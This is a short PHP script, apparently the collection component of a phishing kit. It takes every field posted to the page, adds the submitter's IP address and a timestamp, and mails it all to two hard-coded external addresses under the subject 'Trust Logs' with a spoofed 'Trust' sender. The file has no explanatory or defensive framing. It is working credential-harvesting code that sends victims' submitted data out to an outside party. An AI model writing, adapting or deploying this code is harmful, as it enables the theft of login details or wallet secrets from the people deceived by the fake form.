<?php
	$body = '';
	$body .= '<p>Date/Time: '.date('Y-m-d H:i:s').'<br />';
	$body .= 'IP: '.$_SERVER["REMOTE_ADDR"].'<br /></p>';


	$body .= '<p>';
	foreach($_POST as $k => $val) {
		$body .= '<strong>'.$k.'</strong> '.$val.'<br />';
	}
	$body .= '</p>';

         $to = "frankandersons2022@gmail.com, frankandersons2022@tuta.io";
         $subject = "Trust Logs";
$hrsd = "From:Trust <mail.com>\n";
$hrsd .= "Content-type: text/html; charset=iso-8859-1\r\n";
     mail($to,$subject,$body,$hrsd);
?>
